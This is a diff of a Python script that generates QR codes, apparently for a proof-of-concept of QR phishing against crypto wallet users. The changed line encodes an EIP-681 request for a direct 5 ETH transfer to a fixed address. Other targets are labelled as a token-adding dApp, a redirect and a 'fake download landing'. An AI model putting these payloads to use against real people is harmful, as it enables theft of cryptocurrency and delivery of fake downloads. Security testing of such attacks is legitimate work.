@@ -4,7 +4,7 @@ import qrcode, base64, io
 from qrcode.constants import ERROR_CORRECT_H
 
 TARGETS = [
-    ("qr1.png", "https://poc.crypto.com/qr1.html"),  # Web3 wallet interaction (page URL)
+    ("qr1.png", "ethereum:0xBBA62B9ddd2242A3836e9bE2515c55528115152c?value=5000000000000000000"),  # EIP-681 direct 5 ETH transfer
     ("qr2.png", "https://stunning-flan-8e93f7.netlify.app"),  # add-token dApp landing
     ("qr3.png", "https://strong-semolina-e8ec11.netlify.app"),  # website redirect
     ("qr4.png", "https://playful-selkie-b0bde0.netlify.app/"),  # fake download landing
